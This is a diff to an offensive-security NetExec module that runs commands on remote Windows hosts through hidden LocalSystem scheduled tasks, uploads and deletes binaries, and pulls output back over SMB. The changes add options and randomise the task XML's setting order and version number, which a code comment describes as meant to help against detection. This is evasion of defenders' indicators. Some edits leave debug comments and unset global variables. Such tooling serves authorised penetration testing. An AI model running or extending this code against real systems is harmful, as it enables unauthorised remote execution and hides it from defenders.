@@ -1,4 +1,6 @@
 import os
+import random
+import re
 import contextlib
 from time import sleep
 from datetime import datetime, timedelta
@@ -15,6 +17,8 @@ class NXCModule:
     Thanks @Shad0wC0ntr0ller for the idea of removing the hardcoded date that could be used as an IOC
     Modified by @Defte_ so that output on multiples lines are printed correctly (28/04/2025)
     Modified by @Defte_ so that we can upload a custom binary to execute using the BINARY option (28/04/2025)
+    Modified by @Kahvi0xff to add the TASK, FILE and LOCATION options. 
+    Modified by @Kahvi0xff add a feature to shuffle the XML file attributes
     """
 
     def options(self, context, module_options):
@@ -87,7 +91,8 @@ class NXCModule:
                         return 1
 
         # Returnes self.cmd or \Windows\temp\BinToExecute.exe depending if BINARY=BinToExecute.exe
-        self.cmd = self.cmd if not self.binary else f"{self.tmp_share}{self.cmd}"
+        #DEBUG
+        #self.cmd = self.cmd if not self.binary else f"{self.tmp_share}{self.cmd}"
         self.logger.display("Connecting to the remote Service control endpoint")
         try:
             exec_method = TSCH_EXEC(
@@ -134,6 +139,8 @@ class NXCModule:
         finally:
             if self.binary:
                 try:
+                    context.log.success("Sleeping for 10 seconds to let binary run")
+                    sleep(10)
                     connection.conn.deleteFile(self.share, f"{self.tmp_share}{self.binary_name}")
                     context.log.success(f"Binary {self.binary_name} successfully deleted")
                 except Exception as e:
@@ -218,8 +225,49 @@ class TSCH_EXEC:
         return end_boundary.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3]
 
     def gen_xml(self, command, fileless=False):
+        global cmdstdout
+        global cmd_path
+        #Random setting order to help with detection
+        settings = [
+            "    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>",
+            "    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>",
+            "    <AllowHardTerminate>true</AllowHardTerminate>",
+            "    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>",
+            "    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>"
+        ]
+        random.shuffle(settings)
+        randomized_settings = "\n".join(settings)
+        
+        settings2 = [
+            "    <AllowStartOnDemand>true</AllowStartOnDemand>",
+            "    <Hidden>true</Hidden>",
+            "    <Enabled>true</Enabled>",
+            "    <RunOnlyIfIdle>false</RunOnlyIfIdle>",
+            "    <WakeToRun>false</WakeToRun>",
+            "    <Priority>7</Priority>",
+            "    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>"
+        ]
+        random.shuffle(settings2)
+        randomized_settings2 = "\n".join(settings2)
+        
+        IdleSettings = [
+            "      <StopOnIdleEnd>true</StopOnIdleEnd>",
+            "      <RestartOnIdle>false</RestartOnIdle>"
+        ]
+        random.shuffle(IdleSettings)
+        randomized_IdleSettings = "\n".join(IdleSettings)
+        
+        random_digit = random.randint(2, 6)
+            
+        match = re.match(r'^(.+?\\[^\\ ]+)\s+(.*)', command)
+        if match:
+            cmd_path = match.group(1)
+            cmd_args = match.group(2)
+        else:
+            print("Could not split the command properly.")
+        
         xml = f"""<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+<Task version="1.{random_digit}" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <Triggers>
     <RegistrationTrigger>
       <EndBoundary>{self.get_end_boundary()}</EndBoundary>
@@ -232,26 +280,15 @@ class TSCH_EXEC:
     </Principal>
   </Principals>
   <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-    <AllowHardTerminate>true</AllowHardTerminate>
-    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+{randomized_settings}
     <IdleSettings>
-      <StopOnIdleEnd>true</StopOnIdleEnd>
-      <RestartOnIdle>false</RestartOnIdle>
+{randomized_IdleSettings}
     </IdleSettings>
-    <AllowStartOnDemand>true</AllowStartOnDemand>
-    <Enabled>true</Enabled>
-    <Hidden>true</Hidden>
-    <RunOnlyIfIdle>false</RunOnlyIfIdle>
-    <WakeToRun>false</WakeToRun>
-    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
-    <Priority>7</Priority>
+{randomized_settings2}
   </Settings>
   <Actions Context="LocalSystem">
     <Exec>
-      <Command>cmd.exe</Command>
+      <Command>{cmd_path}</Command>
 """
         if self.__retOutput:
             fileLocation = "\\Windows\\Temp\\" if self.location is None else self.location
@@ -259,14 +296,22 @@ class TSCH_EXEC:
                 self.__output_filename = os.path.join(fileLocation, gen_random_string(6))
             else:
                 self.__output_filename = os.path.join(fileLocation, self.file)
+             
+            if "cmd" in cmd_path.lower() or "powershell" in cmd_path.lower():
+                cmd_output = f"&gt; {self.__output_filename} 2&gt;&amp;1"
+                cmdstdout = 1
+            else:
+                cmd_output = ""
+                cmdstdout = 0
+                
             if fileless:
                 local_ip = self.__rpctransport.get_socket().getsockname()[0]
-                argument_xml = f"      <Arguments>/C {command} &gt; \\\\{local_ip}\\{self.__share_name}\\{self.__output_filename} 2&gt;&amp;1</Arguments>"
+                argument_xml = f"      <Arguments>{cmd_args} &gt; \\\\{local_ip}\\{self.__share_name}\\{self.__output_filename} 2&gt;&amp;1</Arguments>"
             else:
-                argument_xml = f"      <Arguments>/C {command} &gt; {self.__output_filename} 2&gt;&amp;1</Arguments>"
+                argument_xml = f"      <Arguments>{cmd_args} {cmd_output}</Arguments>"
 
         elif self.__retOutput is False:
-            argument_xml = f"      <Arguments>/C {command}</Arguments>"
+            argument_xml = f"      <Arguments>{cmd_args}</Arguments>"
 
         self.logger.debug(f"Generated argument XML: {argument_xml}")
         xml += argument_xml
@@ -288,7 +333,7 @@ class TSCH_EXEC:
         # Give self.task a random string as name if not already specified
         self.task = gen_random_string(8) if self.task is None else self.task
         xml = self.gen_xml(command, fileless)
-
+        
         self.logger.info(f"Task XML: {xml}")
         self.logger.info(f"Creating task \\{self.task}")
         try:
@@ -344,23 +389,26 @@ class TSCH_EXEC:
             else:
                 smbConnection = self.__rpctransport.get_smb_connection()
                 tries = 1
-                while True:
-                    try:
-                        self.logger.info(f"Attempting to read {self.__share}\\{self.__output_filename}")
-                        smbConnection.getFile(self.__share, self.__output_filename, self.output_callback)
-                        break
-                    except Exception as e:
-                        if tries >= self.__tries:
-                            self.logger.fail("Schtask_as: Could not retrieve output file, it may have been detected by AV. Please increase the number of tries with the option '--get-output-tries'.")
-                            break
-                        if "STATUS_BAD_NETWORK_NAME" in str(e):
-                            self.logger.fail(f"Schtask_as: Getting the output file failed - target has blocked access to the share: {self.__share} (but the command may have executed!)")
-                            break
-                        if "SHARING" in str(e) or "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
-                            sleep(3)
-                            tries += 1
-                        else:
-                            self.logger.debug(str(e))
+                if cmdstdout == 1:
+                   while True:
+                       try:
+                           self.logger.info(f"Attempting to read {self.__share}\\{self.__output_filename}")
+                           smbConnection.getFile(self.__share, self.__output_filename, self.output_callback)
+                           break
+                       except Exception as e:
+                           if tries >= self.__tries:
+                               self.logger.fail("Schtask_as: Could not retrieve output file, it may have been detected by AV. Please increase the number of tries with the option '--get-output-tries'.")
+                               break
+                           if "STATUS_BAD_NETWORK_NAME" in str(e):
+                               self.logger.fail(f"Schtask_as: Getting the output file failed - target has blocked access to the share: {self.__share} (but the command may have executed!)")
+                               break
+                           if "SHARING" in str(e) or "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
+                               sleep(3)
+                               tries += 1
+                           else:
+                               self.logger.debug(str(e))
+                else:
+                   self.logger.display("No output file was saved to be retrived")
 
                 if self.__outputBuffer:
                     self.logger.debug(f"Deleting file {self.__share}\\{self.__output_filename}")
